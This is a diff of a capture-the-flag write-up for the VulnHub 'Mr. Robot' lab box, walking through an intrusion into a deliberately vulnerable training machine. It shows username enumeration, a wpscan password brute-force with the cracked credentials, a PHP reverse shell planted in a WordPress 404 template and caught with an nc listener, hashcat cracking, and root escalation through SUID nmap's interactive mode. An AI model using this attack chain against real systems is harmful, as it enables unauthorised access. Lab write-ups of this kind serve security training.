@@ -2,15 +2,14 @@
 title: "VulnHub | Mr. Robot - Writeup"
 excerpt: Writeup for Mr. Robot from VulnHub
 date: 2019-07-04 00:00:00
-categories: [cybersec, infosec, vulnhub]
-tags: [mr. robot, php, privilege escalation, reverse shell, wordpress]
+categories: [VulnHub]
 ---
 
 ## Information
-Mr. Robot is a simple-intermediate level box on VulnHub that is based on the popular TV series of the same name; Mr. 
-Robot. The box has 3 keys to capture and the box aims to make the pentester utilize various tools and methods to 
-capture these keys. This includes various ways to establish a reverse shell as well as various ways to find possible 
-vulnerabilities in the system.
+Mr. Robot is a simple-intermediate level box on VulnHub that is based on the popular TV series of the same name. 
+
+Mr. Robot has 3 keys to capture and the aims to make the pentester gain control over a Wordpress installation, use it 
+to establish a reverse shell, and then escalate privileges to `root` using vulnerable programs installed in the system.
 
 ## Tasks
 - Capture all 3 keys
@@ -25,7 +24,7 @@ vulnerabilities in the system.
  
 ## Walkthrough
 ### nmap
-We first begin with a pretty basic and standard `nmap` scan to see the services and what we're dealing with.
+We first begin with a standard `nmap` scan to see the services and what we're dealing with.
 
 ```
 $ nmap -sC -sV 192.168.2.243
@@ -40,33 +39,21 @@ PORT    STATE  SERVICE  VERSION
 | ssl-cert: Subject: commonName=www.example.com
 | Not valid before: 2015-09-16T10:45:03
 |_Not valid after:  2025-09-13T10:45:03
-MAC Address: 18:D6:C7:B8:FD:A1 (Tp-link Technologies)
 ```
 
-We have `HTTP` on Port 80 and a closed `SSH` on Port 22.
+We have 3 services running, most notably `HTTP` on Port 80.
 
 ### HTTP
 Taking a look at the `HTTP` by visiting `192.168.2.243` reveals an animated terminal and a message from Mr. Robot.
 
 ![Mr. Robot][Mr. Robot]
 
-There are some commands we can input but none of them reveal anything useful to help us capture our first key. Thus we 
-must scan for hidden directories with `gobuster`. Do note that `directory-list-2.3-medium.txt` was copied from 
-`/usr/share/wordlists/dirbuster/`.
+There are some commands we can input but none of them reveal anything useful to help us capture our first key. As a 
+result enumerating the directories with `gobuster` is the next step. Do note that `directory-list-2.3-medium.txt` was 
+copied from `/usr/share/wordlists/dirbuster/`.
 
 ```
 $ gobuster dir -u 192.168.2.243 -w directory-list-2.3-medium.txt
-=====================================================
-Gobuster v2.0.1              OJ Reeves (@TheColonial)
-=====================================================
-[+] Mode         : dir
-[+] Url/Domain   : http://192.168.2.243/
-[+] Threads      : 10
-[+] Wordlist     : directory-list-2.3-medium.txt
-[+] Status codes : 200,204,301,302,307,403
-[+] Timeout      : 10s
-=====================================================
-2019/07/02 14:27:47 Starting gobuster
 =====================================================
 /images (Status: 301)
 /blog (Status: 301)
@@ -109,8 +96,8 @@ Gobuster v2.0.1              OJ Reeves (@TheColonial)
 =====================================================
 ```
 
-We now know that the website has Wordpress installed and there are several interesting directories. Taking a  look at 
-`/robots` displays a raw paste that reveals two other hidden directories.
+We now know that the website has a Wordpress installation and there are several interesting directories, most notably 
+`/robots`; which displays a raw paste that reveals two other hidden directories.
 
 ![robots.txt][robots.txt]
 
@@ -121,58 +108,22 @@ key-1-of-3.txt
 ```
 
 Visiting `fsocity.dic` allows us to download a dictionary file that we'll probably use later. Visiting `key-1-of-3.txt` 
-lets us access our first key; `073403c8a58a1f80d943455fb30724b9`.
+grants us our first key; `073403c8a58a1f80d943455fb30724b9`.
 
 ### Wordpress
 Since we know Wordpress is present on this machine, we'll try to access the admin console over at `/wp-admin`. Since 
-we don't know the name of the users on this machine, we'll use `Lost Your Password?` and try various usernames related 
-to the TV show to see if anything matches. `admin`,` fsociety`, `robot`, and `mrrobot` were no match but `elliot` was, 
-indicating `elliot` is a known user in the system. 
+we don't know the credentials of the users on this machine, we'll use `Lost Your Password?` and try various usernames 
+related to the TV show to see if anything matches. `admin`,` fsociety` and `mrrobot` prompted "Invalid username or 
+e-mail" while `elliot` was a match; prompting "The e-mail could not be sent. Possible reason: your host may have 
+disabled the mail() function", telling us that `elliot` is a user in the system. 
 
-Using `wpscan` we can scan the Wordpress installation and plugins for possible vulnerabilities and try to brute-force 
-login as `elliot`. Since we were given `fsocity.dic` earlier, it would make sense to use it as our wordlist.
+Using `wpscan` we can brute-force the Wordpress installation to login as `elliot` using the `fsocity.dic` as our 
+wordlist.
 
 ```
 $ wpscan --url 192.168.2.243 --passwords fsocity.dic --usernames elliot
-[+] URL: http://192.168.2.243/
 
-Interesting Finding(s):
-
-[+] http://192.168.2.243/
 [...]
-
-[+] http://192.168.2.243/robots.txt
-[...]
-
-[+] http://192.168.2.243/xmlrpc.php
-[...]
-
-[+] http://192.168.2.243/readme.html
-[...]
-
-[+] http://192.168.2.243/wp-cron.php
-[...]
-
-[+] WordPress version 4.3.19 identified (Latest, released on 2019-03-13).
-[...]
-
-[i] The main theme could not be detected.
-
-[+] Enumerating All Plugins (via Passive Methods)
-
-[i] No plugins Found.
-
-[+] Enumerating Config Backups (via Passive and Aggressive Methods)
-Checking Config Backups - Time: 00:00:00 <========================================> (21 / 21) 100.00% Time: 00:00:00
-
-[i] No Config Backups Found.
-
-[+] Performing password attack on Xmlrpc Multicall against 1 user/s
-Progress Time: 00:57:11 <========================================> (1716 / 1716) 100.00% Time: 00:57:11
-WARNING: Your progress bar is currently at 1716 out of 1716 and cannot be incremented. In v2.0.0 this will become a ProgressBar::InvalidProgressError.
-Progress Time: 00:57:12 <========================================> (1716 / 1716) 100.00% Time: 00:57:12
-[SUCCESS] - elliot / ER28-0652                                                                                                                                                           
-All Found                                                                                                                                                                                
 
 [i] Valid Combinations Found:
 | Username: elliot, Password: ER28-0652
@@ -180,7 +131,7 @@ All Found
 [...]
 ```
 
-`wpscan` found `elliot`'s password to be `ER28-0652`. We can now access Wordpress.
+`wpscan` found `elliot`'s password to be `ER28-0652`. We can now access `/wp-admin`.
 
 ![Wordpress - Panel][Wordpress - Panel]
 
@@ -190,8 +141,8 @@ Checking the panel there is nothing of interest aside images in `Media` and 2 us
 ![Wordpress - Users][Wordpress - Users]
 
 ### Getting a Reverse Shell Via Wordpress
-Let's get a reverse shell using the panel. To do that we'll use [this][PHP Reverse Shell] PHP Reverse Shell script by 
-[pentestmoney][pentestmonkey]. When attempted to upload to Wordpress you're not permitted to upload it.
+To get a reverse shell we'll use `PHP Reverse Shell` script by [pentestmoney][pentestmonkey]{:target="_blank"}. When 
+attempted to upload to Wordpress we're not permitted to upload it.
 
 ![Wordpress - Denied][Wordpress - Denied]
 
@@ -204,7 +155,7 @@ webpages of our choosing. Pasting the script to `404 Template` will suffice as t
 ```
 $ curl http://192.168.2.243/404.php
 
-$ nc -v -n -l -p 7500
+$ nc -lvnp 7500
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=1(daemon) gid=1(daemon) groups=1(daemon)
 /bin/sh: 0: can't access tty; job control turned off
@@ -212,18 +163,11 @@ uid=1(daemon) gid=1(daemon) groups=1(daemon)
 $ cd /home
 
 $ ls -la
-total 12
-drwxr-xr-x  3 root root 4096 Nov 13  2015 .
-drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
 drwxr-xr-x  2 root root 4096 Nov 13  2015 robot
 
 $ cd /home/robot
 
 $ ls -la
-
-total 16
-drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
-drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
 -r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
 -rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
 
@@ -247,6 +191,7 @@ $ hashcat -m 0 -a 0 -d 1 --force hash.txt rockyou.txt
 c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
 ```
 
+Now using `python` we can spawn a proper shell and switch users with the password we found.
 Now let's attempt to switch users in the shell with our password. But in order to do that we need to spawn a proper 
 shell with `python`.
 
@@ -262,10 +207,9 @@ cat key-2-of-3.txt
 822c73956184f694993bede3eb39f959
 ```
 
-### Logging in as Root
-To capture our final flag we'll have to login as `root`. Since we have no clues regarding what the password for it 
-might be, we must attempt privilege escalation. Using [LinEnum][LinEnum], we can scan for possible vulnerabilities in 
-the system.
+### Escalating Privileges to Root
+Using `LinEnum`, we can scan for possible vulnerabilities in the system that may aide us on escalating our privileges 
+to `root` so we can access `/root`.
 
 ```
 $ cd /tmp
@@ -298,10 +242,13 @@ $ ./LinEnum.sh
 [...]
 ```
 
-`LinEnum` revealed an interesting `SUID` regarding `nmap`. Checking its version; `3.81`, is a version that is known to 
+`LinEnum` found an interesting `SUID` regarding `nmap`. Checking its version; `3.81`, is a version that is known to 
 be vulnerable to a certain privilege escalation attacking using `--interactive`.
 
 ```
+$ nmap --version
+Nmap version 3.81 ( https://nmap.org )
+
 $ nmap --interactive
 Welcome to Interactive Mode -- press h <enter> for help
 nmap> !sh
@@ -330,12 +277,10 @@ drwx------  2 root root 4096 Nov 13  2015 .cache
 
 Thus we've captured our third and final key.
 
-[Mr. Robot]:            /images/posts/2019-07-04-vulnhub-mr_robot/Mr.%20Robot.png
-[robots.txt]:           /images/posts/2019-07-04-vulnhub-mr_robot/Robots.png
-[Wordpress - Panel]:    /images/posts/2019-07-04-vulnhub-mr_robot/Wordpress%20-%20Panel.png
-[Wordpress - Users]:    /images/posts/2019-07-04-vulnhub-mr_robot/Wordpress%20-%20Users.png
-[PHP Reverse Shell]:    http://pentestmonkey.net/tools/web-shells/php-reverse-shell
+[Mr. Robot]:            /images/2019-07-04-vulnhub-mr_robot/Mr.%20Robot.png
+[robots.txt]:           /images/2019-07-04-vulnhub-mr_robot/Robots.png
+[Wordpress - Panel]:    /images/2019-07-04-vulnhub-mr_robot/Wordpress%20-%20Panel.png
+[Wordpress - Users]:    /images/2019-07-04-vulnhub-mr_robot/Wordpress%20-%20Users.png
 [pentestmonkey]:        http://pentestmonkey.net/
-[Wordpress - Denied]:   /images/posts/2019-07-04-vulnhub-mr_robot/Wordpress%20-%20Denied.png
-[Wordpress - 404]:      /images/posts/2019-07-04-vulnhub-mr_robot/Wordpress%20-%20404%20Template.png
-[LinEnum]:              https://github.com/rebootuser/LinEnum
+[Wordpress - Denied]:   /images/2019-07-04-vulnhub-mr_robot/Wordpress%20-%20Denied.png
+[Wordpress - 404]:      /images/2019-07-04-vulnhub-mr_robot/Wordpress%20-%20404%20Template.png
